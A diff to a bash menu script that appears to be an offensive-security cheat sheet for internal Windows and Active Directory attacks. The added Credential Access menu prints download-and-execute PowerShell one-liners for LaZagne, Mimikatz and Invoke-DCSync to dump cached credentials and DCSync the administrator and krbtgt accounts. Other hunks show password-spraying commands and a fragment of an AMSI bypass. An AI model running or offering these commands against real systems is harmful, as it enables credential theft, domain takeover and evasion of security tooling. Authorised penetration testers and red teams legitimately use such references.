@@ -77,24 +77,131 @@ echo -e ""
 echo -ne " What would you like to do?
 
 
-	1)  ->  [ MiTM Attacks 		]
-        2)  ->  [ Password Spraying 	]
-        3)  ->  [ Privilege Escalation	]
-        4)  ->  [ Recon 		]
+	1)  ->  [ Credential Access	]
+	2)  ->  [ MiTM Attacks 		]
+        3)  ->  [ Password Spraying 	]
+        4)  ->  [ Privilege Escalation	]
+        5)  ->  [ Recon 		]
         
-        a) ->	[ AMSI Bypasses		]
+        a)  ->	[ AMSI Bypasses		]
         
 "
         read a
         case $a in
-        	1) 	Internal_Menu_MiTM_Attacks ;;
-	        2) 	Internal_Menu_Password_Spraying ;;
-	        3) 	Internal_Menu_Privilege_Escalation ;;
-	        4) 	Internal_Menu_Recon ;;
+                1) 	Internal_Menu_Credential_Access ;;
+        	2) 	Internal_Menu_MiTM_Attacks ;;
+	        3) 	Internal_Menu_Password_Spraying ;;
+	        4) 	Internal_Menu_Privilege_Escalation ;;
+	        5) 	Internal_Menu_Recon ;;
 	        a|A)	Internal_Menu_AMSI_Bypasses ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
+}
+
+Internal_Menu_Credential_Access(){
+
+	clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -ne " Select Credential Access Type
+
+
+
+        1)  ->  [ Credential Dumping 			]
+        2)  ->  [ Credentials from Credential Manager	]
+        3)  ->  [ Credentials from Group Policy		]
+        4)  ->	[ Credentials from Web Browsers		]
+        5)  -> 	[ Unsecured Credentials			]
+"
+
+        read a
+        case $a in
+                1) 	Internal_Menu_Credential_Access_Credential_Dumping ;;
+        	2) 	Internal_Menu_Credential_Access_Credential_Manager ;;
+	        3) 	Internal_Menu_Credential_Access_Credential_Group_Policy ;;
+	        4) 	Internal_Menu_Credential_Access_Credential_Web_Browsers ;;
+	        5) 	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+
+Internal_Menu_Credential_Access_Credential_Dumping(){
+
+	clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -ne " Select Credential Dumping Type
+
+
+
+        1)  ->  [ Cached Domain Credentials ]
+        2)  ->  [ DCSync		    ]
+        3)  ->  [ LSA Secrets		    ]
+        4)  ->	[ LSASS Memory		    ]
+        5)  -> 	[ NTDS			    ]
+        6)  ->	[ SAM			    ]
+"
+
+        read a
+        case $a in
+                1) 	Internal_Menu_Credential_Access_Credential_Dumping_Cached_Domain_Credentials ;;
+        	2) 	Internal_Menu_Credential_Access_Credential_Dumping_DCSync ;;
+	        3) 	Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets ;;
+	        4) 	Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory ;;
+	        5) 	Internal_Menu_Credential_Access_Credential_Dumping_NTDS ;;
+	        6)	Internal_Menu_Credential_Access_Credential_Dumping_SAM ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+Internal_Menu_Credential_Access_Credential_Dumping_Cached_Domain_Credentials(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""      
+echo -e "${LGREEN}Cached Domain Credentials${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}LaZagne${RESTORE}"
+echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
+echo -e ""
+echo -e "${IBLUE}Mimikatz${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::cache"\"'"
+echo -e ""
+echo -e ""
+
+}
+
+
+Internal_Menu_Credential_Access_Credential_Dumping_DCSync(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""      
+echo -e "${LGREEN}DCSync${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Invoke-DCSync${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-DCSync.ps1);Invoke-DCSync"
+echo -e ""
+echo -e "${IBLUE}Mimikatz${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:administrator"\"'"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:krbtgt"\"'"
+echo -e ""
+echo -e ""
+
 }
 
 
@@ -700,18 +807,18 @@ echo -e ""
 echo -e ""
 echo -e "${LGREEN}Password Spraying${RESTORE}"
 echo -e ""
-echo -e "${IBLUE}*Invoke-SprayEmptyPassword${RESTORE}"
+echo -e "${IBLUE}Invoke-SprayEmptyPassword${RESTORE}"
 echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword"
 echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword -Domain Security.local -OutFile EmptyPasswordUsers.txt"
 echo -e ""
-echo -e "${IBLUE}*Domain Password Spray${RESTORE}"
+echo -e "${IBLUE}Domain Password Spray${RESTORE}"
 echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray"
 echo -e ""
-echo -e "${IBLUE}*Rubeus${RESTORE}"
+echo -e "${IBLUE}Rubeus${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /password:Password123 /noticket /nowrap"\""
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /passwords:PasswordList.txt /noticket /nowrap"\""
 echo -e ""
-echo -e "${IBLUE}*SharpSpray${RESTORE}"
+echo -e "${IBLUE}SharpSpray${RESTORE}"
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray"
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray --Passwords Password1,PAsSW0rd,Qwerty123"
 echo -e ""
@@ -752,6 +859,18 @@ $a=[Ref].Assembly.GetType($k)
 $a.GetField($r,'\'NonPublic,Static\'').SetValue($null,$true)
 '
 echo -e ""
+echo -ne  "Return to Internal Main Menu?
+
+
+        1)  ->  [ Internal Main Menu ]
+"
+
+        read a
+        case $a in
+        	1) Internal_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
 
 }
 
